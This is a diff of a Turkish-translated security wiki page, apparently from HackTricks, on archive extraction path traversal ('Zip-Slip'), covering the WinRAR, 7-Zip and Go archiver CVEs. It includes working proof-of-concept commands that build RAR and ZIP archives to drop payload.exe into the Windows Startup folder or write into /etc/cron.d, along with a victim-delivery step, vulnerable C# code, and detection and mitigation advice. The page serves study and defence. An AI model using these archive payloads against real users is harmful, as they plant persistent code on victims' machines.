@@ -1,31 +1,53 @@
-# Arşiv Çıkarma Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)
+# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)
 
 {{#include ../banners/hacktricks-training.md}}
 
 ## Genel Bakış
 
-Birçok arşiv formatı (ZIP, RAR, TAR, 7-ZIP, vb.) her girişe kendi **internal path**'ini taşıma izni verir. Bir çıkarma aracı bu yolu sorgusuz sualsiz uygularsa, `..` içeren veya bir **absolute path** (ör. `C:\Windows\System32\`) barındıran kötü amaçlı bir dosya adı, kullanıcının seçtiği dizinin dışına yazılacaktır.
-Bu zafiyet sınıfı yaygın olarak *Zip-Slip* veya **archive extraction path traversal** olarak bilinir.
+Birçok arşiv formatı (ZIP, RAR, TAR, 7-ZIP, vb.) her girdinin kendi **internal path**'ini taşımasına izin verir. Bir çıkarma aracı bu yolu körü körüne uygularsa, içinde `..` bulunan veya bir **mutlak yol** (ör. `C:\Windows\System32\`) içeren özel hazırlanmış bir dosya adı kullanıcının seçtiği dizinin dışına yazılacaktır.
+Bu zafiyet sınıfı genellikle *Zip-Slip* veya **archive extraction path traversal** olarak bilinir.
 
-Sonuçlar, rastgele dosyaların üzerine yazılmasından Windows *Startup* klasörü gibi **auto-run** bir konuma payload bırakılarak doğrudan **remote code execution (RCE)** elde edilmesine kadar değişir.
+Etkileri rastgele dosyaların üzerine yazmaktan, Windows *Startup* klasörü gibi bir **auto-run** konumuna bir payload bırakarak doğrudan **remote code execution (RCE)** elde etmeye kadar değişir.
 
 ## Kök Neden
 
 1. Saldırgan, bir veya daha fazla dosya başlığının şunları içerdiği bir arşiv oluşturur:
-* Relative traversal sequences (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
-* Absolute paths (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
-* Or crafted **symlinks** that resolve outside the target dir (common in ZIP/TAR on *nix*).
-2. Kurban, gömülü yolu temizlemek veya çıkarımı seçilen dizinin altına zorlamak yerine, gömülü yoluna (veya symlinks'leri takip ederek) güvenen bir zafiyetli araçla arşivi çıkarır.
+* Göreli dizin atlama dizileri (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
+* Mutlak yollar (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
+* Veya hedef dizinin dışına çözümlenen özel hazırlanmış **symlinks** (özellikle ZIP/TAR'da *nix* ortamlarında yaygın).
+2. Mağdur, gömülü yolu güvenilir kabul eden (veya symlink'leri takip eden) zafiyetli bir araçla arşivi çıkarır; araç yolu temizlemek (sanitize etmek) veya çıkarmayı seçilen dizin altına zorlamak yerine buna göre davranır.
 3. Dosya saldırganın kontrolündeki konuma yazılır ve sistem veya kullanıcı o yolu tetiklediğinde bir sonraki sefer çalıştırılır/yüklenir.
 
-## Real-World Example – WinRAR ≤ 7.12 (CVE-2025-8088)
+### .NET `Path.Combine` + `ZipArchive` traversal
 
-Windows için WinRAR ( `rar` / `unrar` CLI, DLL ve portable kaynak dahil) çıkarma sırasında dosya adlarını doğrulayamadı.
-Aşağıdakine benzer bir giriş içeren kötü amaçlı bir RAR arşivi:
+Yaygın bir .NET anti-pattern'i, hedeflenen hedef dizini **kullanıcı kontrollü** `ZipArchiveEntry.FullName` ile birleştirip yol normalizasyonu yapmadan çıkarmaktır:
+```csharp
+using (var zip = ZipFile.OpenRead(zipPath))
+{
+foreach (var entry in zip.Entries)
+{
+var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
+entry.ExtractToFile(dest);
+}
+}
+```
+- Eğer `entry.FullName` `..\\` ile başlıyorsa traversal yapar; eğer bir **mutlak yol** ise sol bileşen tamamen atılır, çıkarma kimliği olarak **keyfi dosya yazma** sağlar.
+- Zamanlanmış bir tarayıcı tarafından izlenen kardeş `app` dizinine yazmak için proof-of-concept arşivi:
+```python
+import zipfile
+with zipfile.ZipFile("slip.zip", "w") as z:
+z.writestr("../app/0xdf.txt", "ABCD")
+```
+ZIP dosyasını izlenen gelen kutusuna bırakmak `C:\samples\app\0xdf.txt` dosyasının oluşmasına neden olur; bu, `C:\samples\queue\` dizininin dışına traversal yapıldığını kanıtlar ve follow-on primitives (örn. DLL hijacks) kullanılmasına olanak tanır.
+
+## Gerçek Dünya Örneği – WinRAR ≤ 7.12 (CVE-2025-8088)
+
+Windows için WinRAR ( `rar` / `unrar` CLI, DLL ve taşınabilir kaynak dahil) çıkarma sırasında dosya adlarını doğrulamada başarısız oldu.
+Kötü amaçlı bir RAR arşivi aşağıdaki gibi bir girdi içeriyordu:
 ```text
 ..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
 ```
-seçilen çıktı dizininin **dışında** ve kullanıcının *Startup* klasörünün içinde sonlanır. Oturum açıldıktan sonra Windows orada bulunan her şeyi otomatik olarak çalıştırır, böylece *kalıcı* RCE sağlar.
+seçilen çıktı dizininin **dışında** ve kullanıcının *Startup* klasörünün içinde yer alır. Oturum açıldıktan sonra Windows orada bulunan her şeyi otomatik olarak çalıştırır; bu da *kalıcı* RCE sağlar.
 
 ### PoC Arşivi Oluşturma (Linux/Mac)
 ```bash
@@ -34,65 +56,67 @@ mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Men
 cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
 rar a -ep evil.rar evil/*
 ```
-Kullanılan seçenekler:
-* `-ep`  – dosya yollarını tam olarak verildiği gibi sakla (başındaki `./`'i **kırpmayın**).
+Options used:
+* `-ep`  – dosya yollarını verildiği gibi sakla (başındaki `./` öğesini **kırpma**).
 
-evil.rar dosyasını hedefe gönderin ve zafiyetli bir WinRAR sürümüyle çıkarmalarını söyleyin.
+Deliver `evil.rar` to the victim and instruct them to extract it with a vulnerable WinRAR build.
 
-### Vahşi Doğada Gözlemlenen Sömürü
+### Observed Exploitation in the Wild
 
-ESET, RomCom (Storm-0978/UNC2596) hedef odaklı kimlik avı kampanyalarının RAR arşivleri ekleyerek CVE-2025-8088'i kötüye kullandığını; özelleştirilmiş backdoors dağıtmak ve ransomware operasyonlarını kolaylaştırmak için bu yöntemi kullandıklarını bildirdi.
+ESET, CVE-2025-8088’i kötüye kullanan ve özelleştirilmiş backdoor’lar dağıtarak fidye yazılımı operasyonlarını kolaylaştıran RAR ekli RomCom (Storm-0978/UNC2596) spear-phishing kampanyalarını bildirdi.
 
-## Daha Yeni Vakalar (2024–2025)
+## Newer Cases (2024–2025)
 
 ### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
-* **Hata**: ZIP girdilerindeki **symbolic links** çıkarma sırasında dereference ediliyordu; bu durum saldırganların hedef dizinden kaçmasına ve keyfi yollar üzerine yazmasına izin veriyordu. Kullanıcı etkileşimi sadece arşivi *açmak/çıkarmak*.
-* **Etkilenen**: 7-Zip 21.02–24.09 (Windows & Linux sürümleri). **25.00** (Temmuz 2025) ve sonrası ile düzeltildi.
-* **Etkilenme yolu**: `Start Menu/Programs/Startup` veya servis tarafından çalıştırılan konumların üzerine yazma → kod bir sonraki oturum açmada veya servis yeniden başlatıldığında çalışır.
-* **Hızlı PoC (Linux)**:
+* **Bug**: Çıkarma sırasında **symbolic link** olan ZIP girdilerinin dereference edilmesi, saldırganların hedef dizinden kaçmasına ve rastgele yolları üzerine yazmasına olanak tanıyordu. Kullanıcı etkileşimi yalnızca arşivin *açılması/çıkarılması*dır.
+* **Affected**: 7-Zip 21.02–24.09 (Windows & Linux build’leri). **25.00** (Temmuz 2025) ve sonrası sürümlerde düzeltildi.
+* **Impact path**: `Start Menu/Programs/Startup` veya servislerin çalıştığı konumları üzerine yazma → bir sonraki oturum açmada veya servis yeniden başladığında kod çalıştırılır.
+* **Quick PoC (Linux)**:
 ```bash
 mkdir -p out
 ln -s /etc/cron.d evil
 zip -y exploit.zip evil   # -y preserves symlinks
 7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
 ```
-Düzeltilmiş bir sürümde `/etc/cron.d` etkilenmez; symlink /tmp/target içinde bir bağlantı olarak çıkarılır.
+Patchelenmiş bir build’te `/etc/cron.d` dokunulmaz; symlink /tmp/target içinde bir link olarak çıkarılır.
 
 ### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
-* **Hata**: `archiver.Unarchive()` `../` ve symlinked ZIP girdilerini takip ederek `outputDir` dışında yazma yapıyordu.
-* **Etkilenen**: `github.com/mholt/archiver` ≤ 3.5.1 (proje artık kullanımdan kaldırıldı).
-* **Çözüm**: `mholt/archives` ≥ 0.1.0'a geçin veya yazmadan önce canonical-path kontrolleri uygulayın.
-* **Minimal yeniden üretme**:
+* **Bug**: `archiver.Unarchive()` `../` ve symlink’li ZIP girdilerini takip ederek `outputDir` dışında yazma yapıyordu.
+* **Affected**: `github.com/mholt/archiver` ≤ 3.5.1 (proje artık deprecated).
+* **Fix**: `mholt/archives` ≥ 0.1.0’a geçin veya yazmadan önce kanonik yol kontrolleri uygulayın.
+* **Minimal reproduction**:
 ```go
 // go test . with archiver<=3.5.1
 archiver.Unarchive("exploit.zip", "/tmp/safe")
 // exploit.zip holds ../../../../home/user/.ssh/authorized_keys
 ```
 
-## Tespit İpuçları
+## Detection Tips
 
-* **Statik inceleme** – Arşiv girdilerini listeleyin ve adı `../`, `..\\`, *absolute paths* (`/`, `C:`) içeren veya hedefi çıkarma dizini dışında olan *symlink* türündeki girdileri işaretleyin.
-* **Kanonikleştirme** – `realpath(join(dest, name))`'in hâlâ `dest` ile başlamasını sağlayın. Aksi takdirde reddedin.
-* **Sandbox içinde çıkarma** – *safe* bir çıkarıcı kullanarak (ör. `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) arşivi geçici bir dizine açın ve oluşan yolların dizin içinde kaldığını doğrulayın.
-* **Uç nokta izlemesi** – WinRAR/7-Zip/… tarafından bir arşiv açıldıktan kısa süre sonra `Startup`/`Run`/`cron` konumlarına yeni yürütülebilir dosyalar yazıldığında uyarı verin.
+* **Static inspection** – Arşiv girdilerini listeleyin ve adı `../`, `..\\`, *mutlak yollar* (`/`, `C:`) içeren veya hedefi çıkarma dizininin dışına çıkan *symlink* türündeki girdileri işaretleyin.
+* **Canonicalisation** – `realpath(join(dest, name))` sonucunun hâlâ `dest` ile başlayıp başlamadığını doğrulayın. Aksi halde reddedin.
+* **Sandbox extraction** – Bir disposable dizine güvenli bir extractor kullanarak açın (ör. `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) ve ortaya çıkan yolların dizin içinde kaldığını doğrulayın.
+* **Endpoint monitoring** – Bir arşiv WinRAR/7-Zip/vs. ile açıldıktan kısa süre sonra `Startup`/`Run`/`cron` konumlarına yeni executable dosyalar yazıldığında uyarı üretin.
 
-## Önlemler ve Sertleştirme
+## Mitigation & Hardening
 
-1. **Çıkarıcıyı güncelleyin** – WinRAR 7.13+ ve 7-Zip 25.00+ yol/symlink sanitizasyonu uygular. Her iki araç da hâlâ otomatik güncellemeye sahip değil.
-2. Mümkünse arşivleri “**Do not extract paths**” / “**Ignore paths**” seçenekleriyle çıkarın.
-3. Unix'te ayrıcalıkları düşürün ve çıkarma öncesi bir **chroot/namespace** bağlayın; Windows'ta **AppContainer** veya bir sandbox kullanın.
-4. Özel kod yazıyorsanız, oluşturma/yazmadan **önce** `realpath()`/`PathCanonicalize()` ile normalleştirme yapın ve hedef dizinden kaçan herhangi bir girişi reddedin.
+1. **Update the extractor** – WinRAR 7.13+ ve 7-Zip 25.00+ path/symlink sanitizasyonu uyguluyor. Her iki araçta da hâlen otomatik güncelleme yok.
+2. Arşivleri mümkünse “**Do not extract paths**” / “**Ignore paths**” ile çıkarın.
+3. Unix’te ayrıcalıkları düşürün ve çıkarma öncesi bir **chroot/namespace** mount edin; Windows’ta **AppContainer** veya bir sandbox kullanın.
+4. Kendi kodunuzu yazıyorsanız, create/write işlemlerinden **önce** `realpath()`/`PathCanonicalize()` ile normalleştirin ve hedef dizinden kaçan herhangi bir girdiyi reddedin.
 
-## Ek Etkilenen / Tarihsel Vakalar
+## Additional Affected / Historical Cases
 
-* 2018 – Snyk tarafından bildirilen büyük *Zip-Slip* uyarısı, birçok Java/Go/JS kütüphanesini etkiledi.
-* 2023 – 7-Zip CVE-2023-4011: `-ao` birleştirme sırasında benzer traversal.
-* 2025 – HashiCorp `go-slug` (CVE-2025-0377): slugs'ta TAR çıkarma traversal (yama v1.2'de).
+* 2018 – Snyk tarafından birçok Java/Go/JS kütüphanesini etkileyen büyük *Zip-Slip* advisory’si.
+* 2023 – 7-Zip CVE-2023-4011, `-ao` birleştirmesi sırasında benzer traversal.
+* 2025 – HashiCorp `go-slug` (CVE-2025-0377) slugs içindeki TAR çıkarma traversal’ı (v1.2’de patch).
 * Yazmadan önce `PathCanonicalize` / `realpath` çağırmayan herhangi bir özel çıkarma mantığı.
 
-## Kaynaklar
+## References
 
 - [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
 - [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
+- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
+- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
 
 {{#include ../banners/hacktricks-training.md}}
